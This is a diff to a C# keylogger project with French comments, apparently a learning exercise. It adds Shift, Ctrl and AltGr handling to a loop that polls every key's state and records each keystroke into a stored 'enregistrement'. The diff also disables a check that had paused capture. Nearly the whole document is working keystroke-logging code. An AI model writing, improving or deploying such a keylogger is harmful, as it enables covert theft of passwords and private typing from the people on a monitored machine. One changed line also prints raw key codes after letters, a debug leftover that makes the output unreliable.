@@ -51,9 +51,12 @@ namespace ProjetKeyLogger
 
             //capture les frappes de touches et les afficher dans la console
             bool majuscule = false;
-
+            bool shift = false;
+            bool ctrl = false;
+            bool altgr = false;
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
+               
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                 Thread.Sleep(5); //nombre en miliseconde
 
@@ -71,11 +74,9 @@ namespace ProjetKeyLogger
                     int statut_cle = GetAsyncKeyState(list_non_accepte[i]);
                     if (statut_cle == 32769) { autorise_saisie = false;  }
                 }
-
-                //verification de l'état de chaque touche (up ou down)
-                //avec une table des code ASCII, les codes de clavier vont de 0 à 127
-                //on va vérifier ces 128 touches
                 
+                //verification de l'état de chaque touche (up ou down)
+                                
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
                    
@@ -83,7 +84,7 @@ namespace ProjetKeyLogger
                     //le statut d'un clé est a 0 si elle n'est pas active
                     //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                     // on caste le nombre ascii en char
-                    if (statut_cle == 32769 && autorise_saisie == true)
+                    if (statut_cle == 32769) //&& autorise_saisie == true)
                     {
                         string valeurs;
                         switch (codeASCII)
@@ -100,12 +101,12 @@ namespace ProjetKeyLogger
                                 break;
 
                             case 16:
-                                Console.Write("SHIFT");
+                                 shift = true;
                                 break;
 
                             //si touche majuscule
                             case 20:
-                                if ( majuscule == false)
+                                if (majuscule == false)
                                 {
                                     majuscule = true;
                                 } else
@@ -113,8 +114,8 @@ namespace ProjetKeyLogger
                                     majuscule = false;
                                 }
                                break;
+                           
                             case 8:
-                            
                                 enregistrement.effacerContenu();
                                 break;
 
@@ -135,8 +136,22 @@ namespace ProjetKeyLogger
                             case 55:
                             case 56:
                             case 57:
-                                valeurs = "à&é\"'(-è_ç";
-                                Console.Write(valeurs.Substring(codeASCII - 48, 1));
+                                if (majuscule==false & altgr==false & shift==false)
+                                {
+                                    valeurs = "à&é\"'(-è_ç";
+                                    Console.Write(valeurs.Substring(codeASCII - 48, 1));
+                                } else
+                                {
+                                    if (altgr == true)
+                                    {
+                                        valeurs = "@ ~#{[|`\\^";
+                                        Console.Write(valeurs.Substring(codeASCII - 48, 1));
+                                        altgr = false;
+                                    } else
+                                    {
+                                        Console.Write((char)codeASCII);
+                                    }
+                                }                                
                                 break;
 
                             //cas du pavé numérique
@@ -153,6 +168,7 @@ namespace ProjetKeyLogger
                                 Console.Write((int)codeASCII - 96);
                                 break;
 
+                            //Touches à côté du pavé numérique
                             case 106:
                             case 107:
                             case 109:
@@ -169,6 +185,23 @@ namespace ProjetKeyLogger
                             //l'autre shift
                             case 160:
                             case 161:
+                                shift = true;
+                                break;
+
+                            //ctrl
+                            case 162:
+                            case 163:
+                                ctrl = true;
+                                break;
+                            //alt
+                            //le alt sert à inserer des caracteres spéciaux avec le pavé numerique mais trop relou il doit en avoir des centaines on peut pas tous les faire??
+                            // genre alt+3 ca fait ♥ et ca jusqu'à +200..
+                            case 164:
+                                break;
+
+                            //alt gr
+                            case 165:
+                                altgr = true;
                                 break;
 
                             case 186:
@@ -177,14 +210,22 @@ namespace ProjetKeyLogger
                             case 190:
                             case 191:
                             case 192:
-                                valeurs = "$=, ;:ù£+? ./%";
-                                if (majuscule == false)
+                                valeurs = "$=, ;:ù£+? ./%¤}";
+                                if ((majuscule == true | shift == true)& altgr==false)
                                 {
-                                    Console.Write(valeurs.Substring(codeASCII - 186, 1));
+                                    Console.Write(valeurs.Substring(codeASCII - 179, 1));
+                                    shift = false;
                                 }
                                 else
                                 {
-                                    Console.Write(valeurs.Substring(codeASCII - 179, 1));
+                                    if (altgr == true & (codeASCII==186 | codeASCII==187))
+                                    {
+                                        Console.Write(valeurs.Substring(codeASCII - 172, 1));
+                                        altgr = false;
+                                    } else
+                                    {
+                                        Console.Write(valeurs.Substring(codeASCII - 186, 1));
+                                    }
                                 }
                                 break;
 
@@ -196,18 +237,33 @@ namespace ProjetKeyLogger
                             case 222:
                             case 223:
                                 valeurs = ")*^²!°µ¨²§";
-                                if (majuscule == false)
+                                if ((majuscule == true | shift==true)& altgr==false)
                                 {
-                                    Console.Write(valeurs.Substring(codeASCII - 219, 1));
+                                    Console.Write(valeurs.Substring(codeASCII - 214, 1));
+                                    shift =false;
                                 }
                                 else
                                 {
-                                    Console.Write(valeurs.Substring(codeASCII - 214, 1));
+                                    if(altgr==true & codeASCII==219) {
+                                        Console.Write("]");
+                                    }
+                                    else
+                                    {
+                                        Console.Write(valeurs.Substring(codeASCII - 219, 1));
+                                    }
                                 }
                                 break;
 
                             case 226:
-                                Console.Write("<");
+                                if (shift== false)
+                                {
+                                    Console.Write("<");
+                                }
+                                else
+                                {
+                                    Console.Write(">");
+                                    shift = false;
+                                }
                                 break;
 
                             //les fleches mais jsp pq les nombres sont associés à 255
@@ -220,14 +276,22 @@ namespace ProjetKeyLogger
 
 
                             default:
-                                if (majuscule == false)
+                                if (ctrl == true)
                                 {
-                                    Console.Write(Char.ToLower((char)codeASCII));
-                                }
-                                else
+                                    ctrl = false;
+                                } else
                                 {
-                                    Console.Write(Char.ToUpper((char)codeASCII));
+                                    if (majuscule == true | shift == true)
+                                    {
+                                        Console.Write(Char.ToUpper((char)codeASCII));
+                                        shift = false;
+                                    }
+                                    else
+                                    {
+                                        Console.Write(Char.ToLower((char)codeASCII) + "" + codeASCII);
+                                    }
                                 }
+                                
                                 
                                 //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                 enregistrement.ajouterContenu((char)codeASCII);
